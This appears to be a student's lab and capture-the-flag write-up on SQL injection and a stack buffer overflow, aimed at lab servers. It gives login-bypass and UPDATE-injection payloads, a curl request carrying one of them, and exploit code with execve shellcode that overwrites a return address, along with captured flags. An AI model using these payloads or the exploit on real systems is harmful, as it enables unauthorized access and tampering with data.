# SQL Injection

## Task 1
To get all the data associated to Alice we just needed to run this simple query: SELECT * FROM credential WHERE Name = 'Alice';

## Task 2

### Task 2.1
To login as the admin we can just insert on the username the following sentence: admin' OR '
This will change the query so that the hashed password is irrelevant.

### Task 2.2
On the terminal, if we run the command "$ curl www.seed-server.com/unsafe_home.php?username=admin%27or%27 " we can login as an admin. On the terminal will be printed the html code with the data of all users.

### Task 2.3
MySQL has a multileoption that prevents more than one sql statement. Basically with this option enabled, everytime we put a ';' (essencial to end a statement and start a new one) all of our input that goes after that gets commented, which will lead to a semantic error because our query will lose some important content and specific chars, ending up not corresponding to a correct sql statement when complemented with the sql code from the webpage.

## Task 3

### Task 3.1
To modify Alice's salary we need to, on the 'Edit Profile' page, insert in one box (for example in the username one) the following sentence: ',salary = '40000
This will include the variable 'salary' on the update statement and we can assign any value we want (int this case we updated the value from 20000 to 40000, doubling Alice's salary).

### Task 3.2
As Alice, to change Boby's salary we need to change the 'id' on the 'where' clause. So to change Boby's salary to 1 dollar we just need to insert the following sentence on any box (for example in the username one): ',salary = '1' WHERE ID = '2';#
This will insert the 'salary' variable on the update statement (just like in task 3.1) and the id used will be 2 (Boby's id, instead of Alice's). The inputed sentence also needs to have a '#' in order to comment the rest of the update statement, so it is overwritten by our code, otherwise we won't be able to change Boby's salary.

--

## Challenge 1
The program has a SQL injection vulnerability.
To login as the admin, we just need to do the same thing as in the Task 2. So, all that was needed was to insert on the username: admin' Or'
And we also needed to insert something on the password field since the website does not allow this field to be left empty, but the content it's not relevant at all.
That way, the $query = "SELECT username FROM user WHERE username = '".$username."' AND password = '".$password."'"; becomes $query = "SELECT username FROM user WHERE username = 'admin' Or'' AND password = '".$password."'";
That way we can log in as the admin without knowing its password.
By logging in as the admin, we could see the flag{44e9441ad346fcdb0f0850669532ec10}.

## Challenge 2
By running the 'checksec' command, we found these protection properties:
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segment
Maeby the most important two things to notice are that the stack does not have a canary, which makes it easy to overwrite, and that the program has a rwx segment, which will make it possible to launch a shell and execute commands.
The program consists in a buffer with 100 bytes, that will be filled with the user's input - "gets(buffer);" (line 12). This is the line where the program's vulnerability lays on.
This vulnerability allows us to explore a buffer overflow and consequently write on the stack whatever we want. We can insert a shell code and then overwrite the return address to execute that shell code, which will give us a bash and full control.
To do these, we made an exploit (exploit_ctf2_semana8.py) that connects with the program. It receives the inicial text, indicating the buffer address (that changes in each execution) and asking us to give it some input. We will need the buffer's address to situate us in the stack, so we stored it:
    received_text = p.recvuntil(b"input:")
    buf = received_text[44:54]
    nuf = int(buf,16)
Then, we created a variable with the shell code:
    shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80" 
    ).encode('latin-1')
That shell code will be placed on the beggining of the buffer and after the 100 bytes from the buffer we will insert on the stack the buffer's address multiple times in steps of 4 bytes to make sure we overwrite the return address.
    start = 0
    content[start:start + len(shellcode)] = shellcode
    ret = nuf
    L = 4
    for offset in range(100,200,4):
      content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
By doing so, we are able to execute the code that is in the beggining of the buffer, the shell code.
By sending the 'content' as the program's input, we launched a bash, and to get the flag we just needed to execute the following command: "cat flag.txt"
This will print the flag on the terminal.
flag{f817ca6b92dc4edb428be0046c40b85d}

